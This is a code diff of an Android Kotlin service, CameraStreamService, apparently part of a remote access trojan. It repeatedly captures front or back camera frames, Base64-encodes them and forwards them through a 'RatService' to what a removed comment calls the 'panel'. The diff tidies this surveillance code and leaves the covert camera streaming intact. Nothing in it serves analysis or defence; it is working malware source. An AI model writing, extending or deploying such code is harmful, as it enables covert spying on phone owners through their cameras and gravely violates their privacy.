@@ -22,10 +22,8 @@ class CameraStreamService : Service() {
     companion object {
         const val TAG = "CameraStream"
         const val NOTIF_ID = 200
-
         @Volatile var isStreaming: Boolean = false
         @Volatile var isFront: Boolean = false
-        @Volatile var streamCallback: ((String) -> Unit)? = null
         @Volatile var intervalMs: Long = 200L
     }
 
@@ -37,7 +35,6 @@ class CameraStreamService : Service() {
     private val cm by lazy {
         getSystemService(Context.CAMERA_SERVICE) as CameraManager
     }
-    private val gson = com.google.gson.Gson()
     private var running = false
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -103,10 +100,6 @@ class CameraStreamService : Service() {
                         val bytes = ByteArray(buf.remaining())
                         buf.get(bytes)
                         val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-
-                        streamCallback?.invoke(b64)
-
-                        // Kirim ke panel via RatService
                         RatService.instance?.sendFrame(
                             if (isFront) "cam_front_frame" else "cam_back_frame",
                             b64
@@ -138,7 +131,6 @@ class CameraStreamService : Service() {
         try {
             val camera = cameraDevice ?: return
             val reader = imageReader ?: return
-
             @Suppress("DEPRECATION")
             camera.createCaptureSession(
                 listOf(reader.surface),
@@ -162,18 +154,13 @@ class CameraStreamService : Service() {
             val camera = cameraDevice ?: return
             val s = session ?: return
             val reader = imageReader ?: return
-
             val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                 addTarget(reader.surface)
                 set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                 set(CaptureRequest.JPEG_QUALITY, 50.toByte())
             }
-
             s.capture(req.build(), null, handler)
-
-            handler?.postDelayed({
-                if (running) loopCapture()
-            }, intervalMs)
+            handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
         } catch (e: Exception) {
             Log.e(TAG, "loopCapture error", e)
         }
